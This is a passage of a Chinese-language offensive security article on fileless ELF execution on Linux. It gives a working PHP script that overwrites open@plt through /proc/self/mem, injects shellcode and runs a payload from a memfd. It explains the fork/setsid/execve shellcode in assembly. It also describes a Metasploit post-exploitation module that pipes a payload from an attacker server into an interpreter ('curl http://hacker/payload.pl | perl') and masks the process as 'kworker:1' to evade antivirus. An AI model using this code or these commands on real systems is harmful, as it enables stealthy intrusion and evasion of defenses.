    preg_match('#s+(.+[stack].*)#', $maps, $m);
    $stack = hexdec(explode('-', $m[1])[0]);
    echo "[INFO] Stack location: ".dechex($stack)."n";
    $pie_base = hexdec(explode('-', $maps)[0]);
    echo "[INFO] PIE base: ".dechex($pie_base)."n";
    echo "[INFO] Trying to get open and system symbols from Libcn";
    list($system_offset, $open_offset) = parseelf($r[1]);
    if($system_offset == 0 or $open_offset == 0) {
        echo "[-] Failed. Exitingn";
        exit;
    }
找到`open()`函数的地址：
    echo "[+] Got them. Seeking for address in memoryn";
    $mem = fopen('/proc/self/mem', 'rb');
    fseek($mem, ((PHP_MAJOR_VERSION == 7) * $pie_base) + $open_php);
    $open_addr = unp(fread($mem, 8));
    echo '[INFO] open@plt addr: 0x' . dechex($open_addr) . "n";
    echo "[INFO] Rewriting open@plt addressn";
    $mem = fopen('/proc/self/mem', 'wb');
现在我们可以开始加载可执行文件。首先我们创建一个匿名文件：
    $shellcode_loc = $pie_base + 0x100;
    $shellcode="x48x31xD2x52x54x5Fx6Ax01x5Ex68x3Fx01x00x00x58x0Fx05x5AxC3";
    fseek($mem, $shellcode_loc);
    fwrite($mem, $shellcode);
    fseek($mem, (PHP_MAJOR_VERSION == 7) * $pie_base + $open_php);
    fwrite($mem, packlli($shellcode_loc));
    echo "[+] Address written. Executing cmdn";
    $fp = fopen('fd', 'w');
将payload写入匿名文件：
    fwrite($fp, $elf);
查找文件描述符编号：
    $found = false;
    $fds = scandir("/proc/self/fd");
    foreach($fds as $fd) {
        $path = "/proc/self/fd/$fd";
        if(!is_link($path)) continue;
        if(strstr(readlink($path), "memfd")) {
            $found = true;
            break;
        }
    }
    if(!$found) {
        echo '[-] memfd not found';
        exit;
    }
将可执行文件路径写入栈：
    fseek($mem, $stack);
    fwrite($mem, "{$path}x00");
    $filename_ptr = $stack;
    $stack += strlen($path) + 1;
    fseek($mem, $stack);
处理待传给可执行程序的参数：
    fwrite($mem, str_replace(" ", "x00", $args) . "x00");
    $str_ptr = $stack;
    $argv_ptr = $arg_ptr = $stack + strlen($args) + 1;
    foreach(explode(' ', $args) as $arg) {
        fseek($mem, $arg_ptr);
        fwrite($mem, packlli($str_ptr));
        $arg_ptr += 8;
        $str_ptr += strlen($arg) + 1;
    }
    fseek($mem, $arg_ptr);
    fwrite($mem, packlli(0x0));
    echo "[INFO] Argv: " . $args . "n";
然后调用`fork()`执行payload：
    echo "[+] Starting ELFn";
    $shellcode = "x6ax39x58x0fx05x85xc0x75x28x6ax70x58x0fx05x6ax39x58x0fx05x85xc0x75x1ax48xbf" 
                . packlli($filename_ptr) 
                . "x48xbe" 
                . packlli($argv_ptr) 
                . "x48x31xd2x6ax3bx58x0fx05xc3x6ax00x5fx6ax3cx58x0fx05";
    fseek($mem, $shellcode_loc);
    fwrite($mem, $shellcode);
    fopen('done', 'r');
    exit();
## 六、Shellcode
Shellcode实际上是可以注入内存运行的一组字节，缓冲区溢出攻击和其他攻击场景中通常会涉及这方面内容。在我们的应用场景中，shellcode并不会返回远程服务器的命令提示符（shell），但可以帮助我们执行所需的命令。
为了获取所需的字节，我们可以开发C代码然后将其转成汇编代码，或者直接使用汇编语言来开发。
我们先来试着理解隐藏在字节数组背后的内容。
    push 57
    pop rax
    syscall
    test eax, eax
    jnz quit
首先我们需要运行`fork`，64位系统上对应的调用号为`57`，具体调用表可参考[此处链接](http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/)。
然后我们需要调用`setsid`（调用号为`112`）将子进程转换成父进程。
    push 112
    pop rax
    syscall
然后再次调用`fork`：
    push 57
    pop rax
    syscall
    test eax, eax
    jnz quit
然后再轻车熟路调用`execve()`：
    ; execve
    mov rdi, 0xcafebabecafebabe ; filename
    mov rsi, 0xdeadbeefdeadbeef ; argv
    xor rdx, rdx ; envp
    push 0x3b
    pop rax
    syscall
    push -1
    pop rax
    ret
最后调用`exit()`（调用号为`60`）结束进程。
    ; exit
    quit:
    push 0
    pop rdi
    push 60
    pop rax
    syscall
通过这种方式我们替换了`open()`函数代码。我们的可执行文件会被注入到内存中，使用PHP解释器运行。我们可以使用shellcode来表示系统调用。
## 七、Metasploit
我们开发了一个MSF[模块](https://github.com/fbkcs/msf-elf-in-memory-execution)，方便大家使用这些技术。
我们可以将该模块文件拷贝至`$HOME/.msf4/module/post/linux/manage/download_exec_elf_in_memory.rb`，然后在Metasploit控制台执行`reload_all`命令，再输入`use
post/linux/manage/download_exec_elf_in_memory`命令来使用该模块（如果拷贝至其他目录，需要使用相应的路径）。在使用该模块之前，我们需要指定一些选项。输入`show
options`显示可设置的选项清单：
  * `ARGS`：传递给可执行文件的参数
  * `FILE`：可执行文件路径，这里我们使用的是Netcat
  * `NAME`：进程名。可以使用任意名称。比如，如果想隐蔽一点，可以使用`kworker:1`，如果想有趣一点，便于演示，可以使用`KittyCat`
  * `SESSION`：meterpreter会话。这个模块主要服务于后渗透（post-exploitation）场景
  * 然后我们需要设定托管payload的http服务器地址及端口，通过`SRVHOST`及`SRVPORT`来设定。
  * `VECTOR`：使用该方法在内存中执行程序，这不是必选参数，如果未设定，则脚本自己会寻找所需的解释器。目前我们支持PHP、Python以及Perl。
接下来运行`exlpoit`或者`run`命令，大家可以参考[演示视频](https://www.youtube.com/watch?v=y9vRUItW_5c)。
整个工作原理如下：我们指定所需的会话（可以是meterpreter或者普通的反弹shell），然后设定ELF文件的本地路径、参数以及显示在进程列表中名称。启动本地web服务器来托管payload，开始搜索用于下载的实用工具（目前支持curl和wget），找到可使用的工具后，如果我们没有在`VECTOR`中指定所需的解释器，则会开始搜索所有可用的解释器。如果找到可用的解释器后，就从我们的web服务器上下载payload，通过管道传输至对应的解释器，效果类似于`$
curl http://hacker/payload.pl | perl`命令。
## 八、总结
在Linux系统中实现无文件执行ELF是渗透测试中一种非常有用的技术。这种方法较为隐蔽，可以绕过各种类型的反病毒保护机制、系统完整性保护机制以及基于硬盘监控的防护系统。通过这种方法，我们能够以最小的动静访问目标。
在本文中我们用到了Linux发行版、内置设备固件、路由器以及移动设备中常见的解释型语言，有些小伙伴们已经[研究过](https://magisterquis.github.io/2018/03/31/in-memory-only-elf-execution.html)这方面内容，在此特别感谢他们对我们的帮助。